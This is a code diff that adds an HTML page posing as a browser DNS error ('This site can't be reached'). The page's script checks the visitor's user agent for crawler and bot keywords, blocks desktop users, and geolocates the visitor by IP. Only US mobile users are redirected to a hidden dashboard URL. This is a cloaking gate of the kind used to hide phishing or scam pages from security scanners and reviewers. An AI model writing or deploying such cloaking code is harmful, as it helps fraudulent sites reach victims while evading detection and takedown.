@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Site can’t be reached</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #fff; color: #333; }
+        .error { color: #333; }
+        .details { color: #666; font-size: 14px; }
+        ul { list-style: none; padding: 0; }
+        li { margin: 5px 0; }
+    </style>
+</head>
+<body>
+    <!-- Fake DNS error message – shown by default -->
+    <h2 class="error">This site can’t be reached</h2>
+    <p><strong>wkfjiwf.com</strong>’s server IP address could not be found.</p>
+    <div class="details">
+        <p>Try:</p>
+        <ul>
+            <li>Checking the connection</li>
+            <li>Checking the proxy, firewall, and DNS configuration</li>
+            <li>Running Windows Network Diagnostics</li>
+        </ul>
+        <p>ERR_NAME_NOT_RESOLVED</p>
+    </div>
+
+    <script>
+        (function() {
+            // ----- CONFIGURATION -----
+            const REAL_URL = 'https://dashboard-jp.pages.dev';
+            // -------------------------
+
+            // 1. BOT DETECTION (user‑agent keywords)
+            const ua = navigator.userAgent.toLowerCase();
+            const botKeywords = ['bot', 'crawl', 'spider', 'scrape', 'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit', 'twitterbot'];
+            for (let keyword of botKeywords) {
+                if (ua.includes(keyword)) {
+                    console.log('Bot detected – showing error.');
+                    return;  // stop, keep showing the error message
+                }
+            }
+
+            // 2. DEVICE DETECTION – block all desktops (allow only mobile)
+            const isMobile = /mobile|android|iphone|ipad|ipod|blackberry|windows phone/i.test(ua);
+            if (!isMobile) {
+                console.log('Desktop PC detected – showing error.');
+                return;  // stop, keep showing the error message
+            }
+
+            // 3. COUNTRY DETECTION (using free ipapi.co – no API key required)
+            fetch('https://ipapi.co/country_code/')
+                .then(response => response.text())
+                .then(countryCode => {
+                    countryCode = countryCode.trim();
+                    if (countryCode !== 'US') {
+                        console.log('Non‑US visitor (' + countryCode + ') – showing error.');
+                        return;  // stop, error remains visible
+                    }
+
+                    // All checks passed: real US mobile user
+                    console.log('Allowed – redirecting to ' + REAL_URL);
+                    window.location.replace(REAL_URL);  // redirect, replaces current page in history
+                })
+                .catch(error => {
+                    // If geolocation API fails, we fall back to showing the error (safe behaviour)
+                    console.log('Country detection failed – showing error by default.', error);
+                });
+        })();
+    </script>
+</body>
+</html>
